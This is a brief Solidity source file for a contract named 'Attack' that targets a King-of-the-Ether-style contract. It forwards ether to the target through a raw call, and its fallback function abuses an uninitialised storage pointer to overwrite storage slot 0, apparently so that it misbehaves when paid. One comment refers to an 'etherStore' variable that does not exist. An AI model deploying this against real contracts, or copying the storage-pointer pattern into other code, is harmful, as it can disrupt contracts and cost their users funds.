pragma solidity ^0.4.25;

contract Attack {
  address kingOfTheEtherThrone;
  struct t{
    uint256 vv;
  }
  uint256 a = 111;

  // intialise the etherStore variable with the contracts address
  constructor(address _address) {
      kingOfTheEtherThrone = _address;
  }

  function send_money() public payable{
      kingOfTheEtherThrone.call.value(msg.value)("test");
  }

  // fallback function - where the magic happens
  function () payable {
    t storage b;
    b.vv = 1000;
  }
}